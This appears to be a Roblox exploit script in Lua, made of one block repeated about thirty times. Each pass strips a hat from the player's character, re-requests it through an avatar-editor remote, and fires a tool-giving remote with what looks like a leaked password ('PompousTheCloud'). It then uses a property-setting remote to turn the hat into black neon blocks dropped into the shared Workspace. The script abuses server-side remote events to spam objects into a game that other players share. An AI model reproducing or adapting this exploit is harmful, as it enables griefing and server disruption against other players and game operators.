CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
